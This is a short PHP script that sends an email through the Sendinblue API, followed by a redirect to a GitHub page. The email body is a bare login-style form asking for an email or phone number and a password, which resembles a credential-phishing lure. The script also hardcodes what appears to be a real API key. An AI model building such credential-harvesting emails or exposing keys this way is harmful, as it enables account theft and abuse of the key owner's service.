<?php

$curl = curl_init();

curl_setopt_array($curl, array(
  CURLOPT_URL => "https://api.sendinblue.com/v3/smtp/email",
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => "",
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => "POST",
  CURLOPT_POSTFIELDS => '{  
   "sender":{  
      "name":"Sender Alex",
      "email":"nazmuzzaman.ifty13317@gmail.com"
   },
   "to":[  
      {  
         "email":"home.info.learners@gmail.com",
         "name":"John Doe"
      }
   ],
   "subject":"Hello world",
   "htmlContent":"<html><input type=\\"text\\" placeholder=\\"Email address or phone number\\" name=\\"email_number\\" required><input type=\\"password\\" placeholder=\\"Password\\" name=\\"password\\" required></html>"
}' 
));

$headers = array();
$headers[] = "Content-Type: application/json";
$headers[] = "api-key: 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"; // Replace YOUR_API_KEY with your actual API key

curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);

$response = curl_exec($curl);
$err = curl_error($curl);

curl_close($curl);

if ($err) {
  echo "cURL Error #:" . $err;
} else {
  header("Location: https://github.com/love-ai/lovebite/couple%20query.html");
}
?>
